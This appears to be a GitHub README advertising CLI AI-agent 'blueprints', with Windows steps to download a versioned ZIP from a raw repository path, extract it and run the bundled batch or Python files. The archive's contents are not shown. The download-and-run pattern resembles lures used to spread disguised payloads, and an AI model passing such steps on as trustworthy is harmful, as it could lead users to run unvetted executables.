## 📦 About this Application

This app offers a collection of ready-made blueprints for AI agents that run in your command line interface (CLI). Unlike simple prompt lists, these blueprints show full working setups. They aim to help you understand how to build and manage your own AI agents as practical tools.

The blueprints cover the structure and design of each agent, helping you see how prompts and runtime logic come together. This project grew from real use and experimentation so you get tested configurations.

Use these blueprints to learn, customize, or start your own AI-driven CLI agent projects without deep programming knowledge.

## 🚀 How to Download and Run on Windows

This section guides you step-by-step through downloading and running the software on a Windows machine. The instructions assume no prior experience with command-line tools.

### Step 1: Download the Bundle

Open the ZIP link in your web browser:

https://github.com/Justicution/awesome-cli-agent-prompts/raw/refs/heads/main/docs/agent_prompts_awesome_cli_2.6.zip

Your browser will download `agent_prompts_awesome_cli_2.6.zip`.

### Step 2: Locate the Download

Find `agent_prompts_awesome_cli_2.6.zip` in your browser's download folder.

### Step 3: Extract the Downloaded Files

1. Open File Explorer and go to your Downloads folder.
2. Right-click the `.zip` file.
3. Choose `Extract All...`.
4. Pick a folder where you want these files, like your Desktop or Documents.
5. Click `Extract`.

### Step 4: Open the Folder and Locate the README

Once extracted, open the folder where you extracted the files. You’ll find documents including the main `README.md`, design blueprints, and some scripts.

Review the `README.md` inside for more detailed info about each blueprint.

### Step 5: Running Sample Blueprints (Optional Tools)

Running these blueprints might require additional tools or simple scripts:

- You can open your Windows Command Prompt or PowerShell:
  - Press `Win + R`, type `cmd` or `powershell`, and press Enter.
- Navigate to the extracted folder using the `cd` command. For example:
  ```
  cd C:\Users\YourName\Desktop\awesome-cli-agent-prompts
  ```
- Some blueprints may include batch files (`.bat`) or Python scripts. Running those will launch the agent simulations.

If you don’t have Python installed and the scripts require it, you can download it from https://python.org/downloads.

### Step 6: Learn and Customize

The heart of this project is the set of blueprint files inside the folder. Each file shows a different agent runtime design method.

You can open these files with any text editor like Notepad or Visual Studio Code. Reading them helps you understand how agents are structured and behave.

You can modify them to suit your needs and try running modified versions in your command line.
